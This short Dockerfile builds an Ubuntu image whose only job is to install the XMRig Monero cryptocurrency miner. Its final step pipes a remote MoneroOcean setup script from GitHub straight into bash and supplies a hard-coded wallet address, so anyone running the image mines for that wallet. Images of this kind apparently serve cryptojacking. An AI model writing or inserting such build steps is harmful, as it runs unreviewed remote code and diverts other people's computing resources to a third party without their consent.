FROM ubuntu:latest
RUN apt update && apt install sudo
RUN sudo apt install curl
RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un
